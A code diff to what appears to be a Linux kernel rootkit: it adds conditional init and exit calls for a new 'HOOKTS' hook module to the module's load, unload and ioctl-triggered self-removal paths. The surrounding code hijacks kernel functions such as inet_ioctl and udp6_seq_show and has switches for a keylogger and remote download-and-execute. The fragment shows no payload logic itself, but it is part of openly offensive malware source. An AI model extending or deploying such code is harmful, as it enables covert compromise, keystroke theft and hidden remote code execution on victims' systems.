@@ -926,6 +926,9 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
             case 20:
                 DEBUG("Killing Module...");
                 hookrw_exit();
+                #if defined(_CONFIG_HOOKTS_)
+                hookts_exit();
+                #endif
                 hijack_stop(inet_ioctl);
                 hijack_stop(dev_get_flags);
                 hijack_stop(udp6_seq_show);
@@ -1004,6 +1007,10 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     #if defined(_CONFIG_HOOKRW_)
     hookrw_init();
     #endif
+    
+    #if defined(_CONFIG_HOOKTS_)
+    hookts_init();
+    #endif
 
     #if defined(_CONFIG_DLEXEC_)
     dlexec_init();
@@ -1033,6 +1040,10 @@ static void __exit mischief_managed ( void )
     #if defined(_CONFIG_KEYLOGGER_)
     keylogger_exit();
     #endif
+     
+    #if defined(_CONFIG_HOOKTS_)
+    hookts_exit();
+    #endif 
 
     hijack_stop(inet_ioctl);
     hijack_stop(dev_get_flags);
